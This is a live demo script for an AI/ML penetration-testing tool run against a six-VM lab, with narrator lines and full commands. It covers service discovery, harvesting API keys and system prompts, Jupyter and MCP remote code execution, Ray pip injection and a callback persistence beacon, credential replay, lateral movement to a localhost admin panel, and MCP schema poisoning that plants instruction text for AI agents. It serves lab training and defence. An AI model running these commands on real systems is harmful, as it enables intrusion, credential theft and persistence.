# Demo Walkthrough

Live demonstration script for the **6-VM mini** aipostex lab. Aligned with the `verify-aipostex.sh` layer model.

---

## Venue Timing Guide

| Format | Duration | Recommended Acts | Notes |
|---|---|---|---|
| **Arsenal walk-up** | ~15 min | Preflight + Acts 1, 3, 4 | Skip Act 2 (gateway); keep Act 4 to 2 proofs |
| **Conference talk** | ~10 min live | Preflight + Acts 1–4 (condensed) | Pre-record Act 5 as a backup slide; narrator-heavy |
| **Full workshop** | ~30 min | All 6 acts + Q&A | Run every command; let attendees follow along |

---

## Preflight

> **Narrator**: "Before we touch the tool, let's prove the lab is real. Six VMs, 29 health-checked service endpoints, 170 planted sensitive findings — all running natively, no containers."

From the attack box:

```bash
bash lab-scripts/verify-lab.sh
```

**Expected**: service health, SSH, ping, and deep validation checks green.

If restoring from snapshot:

```bash
bash lab-scripts/lab-snapshots.sh restore lab-ready
```

**Recovery**: If any service check fails, SSH to the affected VM and restart the service:

```bash
ssh ailab-dev
sudo systemctl restart ollama jupyter acme-mcp gradio-chat
```

---

## Act 1 — Discovery

> **Narrator**: "Step one on any internal pentest: find the attack surface. We scan four hosts and discover the AI/ML service surface in seconds. This is the 'how we find shadow AI' story."

### Network discovery (detect mode, default)

```bash
./aipostex discover network \
  --target 172.16.50.10,172.16.50.20,172.16.50.30,172.16.50.40 \
  --ports 3000,3333,4000,4001,5000,5432,6274,6333,7860,8000,8080,8081,8082,8090,8100,8101,8102,8180,8181,8182,8265,8444,8500,8501,8888,8889,9000,11434
```

**Expected output** (stderr summary):

```
── Discovery Summary ────────────────────────────────────
[*] Probed 4 host(s), selected AI/ML service ports
[*] Open service ports found across dev, ML, data, and app hosts
[*] Confirmed: ollama, jupyter, mcp, gradio, chromadb, mlflow, litellm, ray, ...
[*] Workflow targets generated for discovered services

── Vulnerability Scan ───────────────────────────────────
[*] Mode: Detection Only (no exploitation templates)
[*] Loaded 131 templates (85 detection, 46 exploit)
```

**What to point out**:

- The discovery table shows every open port with `IDENTITY` and `CONFIDENCE`
- Detection-mode templates run automatically — no exploit payloads sent
- The "Next Actions" section suggests concrete follow-on commands with discovered credentials auto-injected
- Detection templates across AI/ML service categories load from a single binary

### File discovery (if time permits)

```bash
./aipostex discover files --path ~/lab/mcp-configs/
```

**Expected**: MCP configuration files detected with credential findings.

**Timing**: ~2 min for network discovery + template scan. Cut file discovery for short demos.

---

## Act 2 — Shadow AI Gateway

> **Narrator**: "LiteLLM is an OpenAI-compatible proxy that aggregates API keys for multiple LLM providers. One config file, four sets of provider credentials. This is the highest-value single target in the lab."

### Auth sweep

```bash
./aipostex openai-compat --target http://172.16.50.20:4000 auth-sweep
```

**Expected**: Shows the endpoint accepts unauthenticated requests with model listing.

### LiteLLM-specific probing

```bash
./aipostex openai-compat --target http://172.16.50.20:4000 litellm-probe
```

**Expected**: Health endpoint reveals backend topology, model configs, and API keys for OpenAI, Anthropic, Azure, and AWS Bedrock.

### Prompt extraction

```bash
./aipostex openai-compat --target http://172.16.50.20:4000 prompt-extract
```

**Expected**: System prompt extracted from the `local-smollm` model (routed to Ollama on ailab-dev).

**What to point out**:

- One proxy, four provider keys — classic shadow AI aggregation pattern
- The tool auto-detects LiteLLM-specific endpoints beyond standard OpenAI-compat
- Compare `:4000` (open) vs `:4001` (authenticated) to show auth-sweep differentiation

**Timing**: ~2 min. For Arsenal, fold one command into Act 1 discovery output and skip the rest.

---

## Act 3 — Data Exposure

> **Narrator**: "Now we go deeper. System prompts from Ollama contain credentials. Vector databases hold corporate data. MCP configs expose API keys in plaintext. None of this requires exploitation — it's all read-only enumeration."

### Ollama system prompts

```bash
./aipostex ollama --target http://172.16.50.10:11434 prompts
```

**Expected**: System prompts extracted from all models, revealing embedded API keys, webhook URLs, JWT tokens, and internal instructions.

### Vector database sensitive data

```bash
./aipostex vectordb --target http://172.16.50.20:8000 --type chromadb search-sensitive
./aipostex vectordb --target http://172.16.50.30:8080 --type weaviate search-sensitive
./aipostex vectordb --target http://172.16.50.30:6333 --type qdrant search-sensitive
```

**Expected**: PII (SSNs, credit cards), API keys, credentials, financial data, and salary information found across vector collections using 32 built-in sensitive-data patterns.

### MCP config analysis

```bash
./aipostex discover files --path ~/lab/mcp-configs/
./aipostex mcp analyze --config ~/lab/mcp-configs/claude_desktop_config.json
```

**Expected**: Plaintext credentials in environment variables, command execution paths, non-loopback exposure, and tool shadowing risks identified.

**What to point out**:

- All of this is read-only — no `--force-exploit` needed
- Credentials discovered here automatically chain into workflow recommendations
- The vector DB search uses 32 patterns covering PII, financial data, credentials, and secrets

**Timing**: ~4 min. For short demos, pick Ollama prompts + one vector DB.

---

## Act 4 — Bounded Proofs

> **Narrator**: "These are gated actions — they require `--force-exploit` and they prove real impact: code execution, package injection, data tampering, model weight theft. Each one is bounded and controlled."

### Jupyter kernel abuse

```bash
./aipostex jupyter --target http://172.16.50.10:8888 pip-proof --force-exploit
```

**Expected**: Creates a kernel, runs `pip install` as proof of arbitrary package installation capability.

### Ray pip injection

```bash
./aipostex ray --target http://172.16.50.20:8265 pip-inject --force-exploit
```

**Expected**: Submits a job with a runtime environment containing a pip package — proves supply chain injection into the ML pipeline.

### MLflow tamper proof

```bash
./aipostex mlflow --target http://172.16.50.20:5000 tamper-proof --force-exploit
```

**Expected**: Creates an experiment and run with logged parameters — proves write access to the experiment tracking system.

### Ollama model weight exfiltration

```bash
./aipostex ollama --target http://172.16.50.10:11434 exfiltrate \
  --model smollm2:135m --force-exploit
```

**Expected**: an **honest negative** — `landed: reachable`. Ollama exposes no blob-download route (`GET /api/blobs/...` is not served) and the on-disk store is `0750 ollama:ollama`, so weight theft is **not** possible over the network or from a low-privilege foothold. The finding says so plainly and names the pivot: model-weight theft requires a local privilege escalation via the co-located MCP RCE. See [Scenario 13](../attack-scenarios/scenario-13.md) for that full chain (MCP RCE → world-writable sudo helper → root → real GGUF bytes).

### MCP poison (if time permits)

```bash
./aipostex mcp --target http://172.16.50.10:3000 poison \
  --mode cmd-inject --command id --force-exploit
```

**Expected**: Command injection via the MCP server's execute tool — proves RCE through the MCP protocol.

**By-hand beat (optional):** the same kernel is drivable turn-by-turn from the **operator console** —
`./aipostex jupyter --target http://172.16.50.10:8888 shell --force-exploit` drops into a Python
REPL you type into live (the by-hand version of the scripted `exec` calls in Acts 9–10). Manual —
the operator runs every line; nothing auto-chains.

**What to point out**:

- Every gated command prints a clear `--force-exploit is required` message if omitted
- Each proof is bounded — we create a test experiment, not delete production data
- Each finding carries its honest grade, not a blanket one: the Jupyter and MCP code-execution proofs land `execution-confirmed`; Ray pip-inject and MLflow tamper are `influenced` (a write/accept, not confirmed execution); Ollama exfiltrate stays `reachable`. The tool never rounds up.

**Timing**: ~3 min. Pick 2–3 proofs for Arsenal; run all 5 for workshops.

**Recovery**: If Jupyter returns 403 (XSRF), restart Jupyter on ailab-dev. If Ray has no seeded jobs, re-seed:

```bash
ssh ailab-ml
sudo /opt/ailab-ml/venv/bin/python3 ~/lab/ml-platform/seed_ray.py
```

---

## Act 5 — Full Assessment

> **Narrator**: "Everything we just did manually? The tool can do it in one pass. `assess network` chains discovery, fingerprinting, template scanning, and enumeration into a single workflow."

### Single-pass assessment

```bash
./aipostex assess network \
  --target 172.16.50.10,172.16.50.20,172.16.50.30,172.16.50.40 \
  --ports 3000,4000,4001,5000,6274,6333,7860,8000,8080,8090,8180,8181,8182,8265,8501,8888,8889,11434
```

### Or full-mode discovery

```bash
./aipostex discover network \
  --target 172.16.50.10,172.16.50.20,172.16.50.30,172.16.50.40 \
  --ports 3000,4000,4001,5000,6274,6333,7860,8000,8080,8090,8180,8181,8182,8265,8501,8888,8889,11434 \
  --mode full
```

**Expected**: Same discovery results as Act 1, plus exploit template findings. The console shows `Mode: Full Assessment (detection + exploitation)`.

**What to point out**:

- Contrast the `detect` output from Act 1 with the `full` output here
- Exploit templates add SSRF, command injection, path traversal, and inference abuse checks
- The HTML report (`--format html --output report.html`) produces an executive-ready deliverable

**Timing**: ~2 min. For talks, show a pre-recorded run or a saved HTML report. For workshops, run live.

---

## Act 6 — MCP Deep Dive

> **Narrator**: "MCP is the newest and most dangerous attack surface. It bridges AI agents to local tools — file systems, databases, cloud APIs. We support HTTP enumeration, stdio transport, config analysis, and 23 MCP templates."

### HTTP enumeration

```bash
./aipostex mcp --target http://172.16.50.10:3000 enum
```

**Expected**: Tool listing with capability classification (fetch, file, exec, inspector) and suggested exploit modes.

### Stdio transport

```bash
./aipostex mcp --transport stdio \
  --stdio-command python3 \
  --stdio-args ~/lab/stdio-mcp-server.py \
  enum
```

**Expected**: Same enumeration over NDJSON stdin/stdout — no HTTP required.

### Config analysis

```bash
./aipostex mcp analyze --config ~/lab/mcp-configs/claude_desktop_config.json
./aipostex mcp analyze --config ~/lab/mcp-configs/remote_mcp_chain.json
```

**Expected**: Transport choices, command execution paths, plaintext credentials, non-loopback exposure, tool shadowing, and remote URL correlation identified.

### Schema poisoning (if time permits)

```bash
./aipostex mcp --target http://172.16.50.10:3000 poison \
  --mode type-field --force-exploit
```

**Expected**: JSON Schema `type` field poisoned with instruction text — demonstrates Full-Schema Poisoning attack.

**What to point out**:

- 23 MCP templates cover infrastructure exposure, CVEs, and server-specific vulnerabilities
- Stdio transport means local MCP servers (Claude Desktop, Cursor) are testable without HTTP
- Schema poisoning modes (type-field, default-value, example-inject, error-message, enum-poison) are based on published research

**Timing**: ~3 min. Skip entirely for Arsenal unless MCP is the audience's focus.

---

## Act 7 — Credential Replay (Post-Exploitation Validation)

> **Narrator**: "Finding a credential is noise — proving it works is signal. Every key we dug out of Ollama system prompts and MLflow artifacts can now be replayed against a downstream validator. The ones that return 200 get escalated to credential-validated."

**Setup** (one-time, after provisioning):

```bash
curl http://172.16.50.40:8765/health                     # Confirm Post-Ex Oracle is up
curl http://172.16.50.40:8765/replay/expectations | jq   # List credential validators
```

**Collect credentials from Ollama system prompts:**

```bash
./aipostex ollama --target http://172.16.50.10:11434 prompts --format json -o ollama-prompts.json
```

**Replay AWS key against POX validator:**

```bash
AWS_KEY=$(jq -r '.findings[] | select(.metadata.pattern=="aws-access-key") | .metadata.value // empty' ollama-prompts.json | head -1)

curl -s -X POST http://172.16.50.40:8765/replay/aws/s3/acme-ml-prod/list \
  -H "X-AWS-Key: ${AWS_KEY}" -H "Content-Type: application/json" -d '{}'
# → {"valid":true,"credential":"AKIAFAKE...","matched_at":"..."}
```

**Replay GitHub PAT against POX validator:**

```bash
GH_TOKEN=$(jq -r '.findings[] | select(.metadata.pattern=="github-pat") | .metadata.value // empty' ollama-prompts.json | head -1)

curl -s -X POST http://172.16.50.40:8765/replay/github/api/user \
  -H "Authorization: Bearer ${GH_TOKEN}"
# → {"valid":true} or {"valid":false,"error":"credential not recognized"}
```

**Check overall replay state:**

```bash
curl -s http://172.16.50.40:8765/state/summary | jq '.replay_validated'
# → number of credentials validated so far
```

**Timing**: ~4 min. Cuts cleanly from Act 3 (data exposure).

---

## Act 8 — Persistence (Ray Beacon)

> **Narrator**: "Persistence means leaving something behind that phones home. We plant a Ray beacon — a job whose payload periodically calls back to a listener we control — and the tool only claims persistence once it actually receives that callback. Accepted-but-silent grades down; the callback is the proof."

**Plant a persistence beacon** (requires `--force-exploit`):

```bash
./aipostex ray --target http://172.16.50.20:8265 beacon \
  --callback-url http://172.16.50.99:18444/ray-beacon \
  --interval 60 --force-exploit
```

**Expected**: The tool submits a Ray job whose payload beacons back to the callback URL on the given interval. When the callback is received it prints `Ray persistence beacon confirmed: raysubmit_...` and grades the finding `stage: own` / `landed: execution-confirmed`. If the job is accepted but the beacon never fires, it grades down to `influenced` — the tool will not claim persistence it cannot observe.

**What to point out**:

- The callback is the proof — an accepted job is only a maybe; a received beacon is `execution-confirmed`
- The beacon persists until the job is killed or the interval expires
- This is the easiest action in the tool to over-claim, so it is the most tightly gated

**Cleanup**: find the `raysubmit_...` id (`./aipostex ray --target http://172.16.50.20:8265 jobs`) and stop it from the Ray dashboard, or restore the estate from the `lab-ready` snapshot.

**Timing**: ~2 min.

---

## Act 9 — Execution Oracle (RCE Confirmation)

> **Narrator**: "Single-shot RCE is one thing. Proving it happened is another. We inject a sentinel-posting payload into a Jupyter kernel, query the oracle, and claim execution-confirmed — a top rung of the aipostex `landed` ladder."

**Get a Jupyter kernel ID** (from Act 4 or fresh):

```bash
KERNEL_ID=$(./aipostex jupyter --target http://172.16.50.10:8888 kernels \
  --format json | jq -r '.findings[0].metadata.kernel // empty' | head -1)
```

**Inject sentinel-posting code via kernel:**

```bash
SENTINEL="exec-$(uuidgen | tr -d '-')"

./aipostex jupyter --target http://172.16.50.10:8888 exec \
  --kernel "${KERNEL_ID}" \
  --code "import urllib.request, json; urllib.request.urlopen('http://172.16.50.40:8765/oracle/sentinel', data=json.dumps({'sentinel':'${SENTINEL}','target':'ailab-dev','notes':'jupyter kernel exec'}).encode(), timeout=3)" \
  --force-exploit
```

**Query the oracle:**

```bash
curl -s "http://172.16.50.40:8765/oracle/verify?sentinel=${SENTINEL}" | jq
# → {"found":true,"count":1,"first_seen":"...","sources":["172.16.50.10"]}
```

**Claim execution-confirmed:**

```bash
# The oracle returned found:true — this is execution-confirmed.
# The payload ran on ailab-dev and called back to the POX on ailab-app.
# No fuzzy matching, no inferred execution — confirmed via out-of-band sentinel.
```

**Reset:**

```bash
curl -s -X POST "http://172.16.50.40:8765/state/reset?token=reset-FAKE-admin-token"
```

**Timing**: ~3 min.

---

## Act 10 — Lateral Movement (Localhost-Only Target)

> **Narrator**: "Network scans show nothing on port 9999. But once we have code execution on ailab-dev via Jupyter, we can read a credential file and pivot to an internal admin panel — a service only reachable from localhost."

**Step 1: Read internal admin token via Jupyter exec** (requires Act 4 kernel):

```bash
./aipostex jupyter --target http://172.16.50.10:8888 exec \
  --kernel "${KERNEL_ID}" \
  --code "open('/home/devuser/.secrets/internal-admin.token').read()" \
  --force-exploit
# → "internal-admin-token-FAKE-A8s92Mx\n"
```

**Step 2: Hit internal admin panel from localhost** (via kernel exec):

```bash
./aipostex jupyter --target http://172.16.50.10:8888 exec \
  --kernel "${KERNEL_ID}" \
  --code "import urllib.request, json; r=urllib.request.urlopen('http://127.0.0.1:9999/admin/status'); print(r.read().decode())" \
  --force-exploit
# → {"service":"internal-admin-panel","vm":"ailab-dev","token_location":"/home/devuser/.secrets/internal-admin.token",...}
```

**Step 3: Retrieve secondary secrets** (drives further lateral movement):

```bash
TOKEN="internal-admin-token-FAKE-A8s92Mx"

./aipostex jupyter --target http://172.16.50.10:8888 exec \
  --kernel "${KERNEL_ID}" \
  --code "import urllib.request, json; req=urllib.request.Request('http://127.0.0.1:9999/admin/secrets',headers={'Authorization':'Bearer ${TOKEN}'}); print(urllib.request.urlopen(req).read().decode())" \
  --force-exploit
# → {"authenticated":true,"secrets":{"db_host":"db-internal-01...","k8s_token":"...","aws_deploy":...}}
```

**Narrate**: "Three hops: public AI endpoint → RCE via unauthenticated Jupyter → internal admin panel → secondary credentials. None of that path was visible from a network scan."

**Timing**: ~3 min.

---

## Closing

> **Narrator**: "We found four target hosts, the AI/ML service surface, multiple unauthenticated control surfaces, and bounded exploit proof paths across Jupyter, Ray, MLflow, Ollama, and MCP — all from a single Go binary with the template and exploit modules loaded for this lab."

**More surfaces (optional):** the estate also runs a real **A2A** agent (`172.16.50.40:8103`) for the
listener-confirmed `card-spoof` landed-ladder beat (`accepted ≠ proven`). The **Kubernetes**
supply-chain angle (anon `secret-read` → `sa-loot` registry-write) runs against the estate
**k8s node** `ailab-k8s` (`172.16.50.50`, vuln `:6443` / secure `:6444`). See
[Manual Post-Exploitation](../post-exploitation/manual.md) for the by-hand `kubectl` continuation.

**Interact by hand — the operator console (optional):** past discovery/scan, the operator can keep
driving any reachable service inside the tool, authed or unauthenticated: `aipostex <module>
request METHOD PATH` for a one-shot call, or `aipostex <module> shell` for a REPL — chat a looted
model, run a Jupyter kernel, call MCP tools, or drive the A2A agent (execution shells take
`--force-exploit`). It's manual; there's no auto-chaining, and k8s stays on the `kubectl` handoff
above. The [Manual Post-Exploitation](../post-exploitation/manual.md) guide shows where it fits.

For audiences that want rigor:

```bash
bash lab-scripts/attack-box/verify-aipostex.sh --layer operator
```

**Expected**: All operator-layer checks pass.

### Key takeaways (for talk slides)

1. **Shadow AI is everywhere** — 29 endpoints across the estate, none intentionally exposed
2. **Read-only discovery finds credentials** — system prompts, vector DB data, MCP configs
3. **Bounded proofs demonstrate impact** — without destroying the environment
4. **131 templates, 18 modules, one binary** — the "Nuclei for AI" approach
5. **Defense is possible** — authentication, network segmentation, MCP config auditing

---

## Appendix: Service Recovery

If a service is unresponsive during the demo:

| Service | VM | Recovery Command |
|---|---|---|
| Ollama | ailab-dev | `ssh ailab-dev && sudo systemctl restart ollama` |
| Jupyter | ailab-dev | `ssh ailab-dev && sudo systemctl restart jupyter` |
| MCP Server | ailab-dev | `ssh ailab-dev && sudo systemctl restart acme-mcp` |
| Gradio | ailab-dev | `ssh ailab-dev && sudo systemctl restart gradio-chat` |
| ChromaDB | ailab-ml | `ssh ailab-ml && sudo systemctl restart chromadb` |
| MLflow | ailab-ml | `ssh ailab-ml && sudo systemctl restart mlflow` |
| LiteLLM | ailab-ml | `ssh ailab-ml && sudo systemctl restart litellm` |
| Ray | ailab-ml | `ssh ailab-ml && sudo systemctl restart ray` |
| Weaviate | ailab-ds | `ssh ailab-ds && sudo systemctl restart weaviate` |
| Qdrant | ailab-ds | `ssh ailab-ds && sudo systemctl restart qdrant` |
| LangServe | ailab-app | `ssh ailab-app && sudo systemctl restart langserve` |
| Streamlit | ailab-app | `ssh ailab-app && sudo systemctl restart streamlit` |

Full lab restore from snapshot:

```bash
bash lab-scripts/lab-snapshots.sh restore lab-ready
```
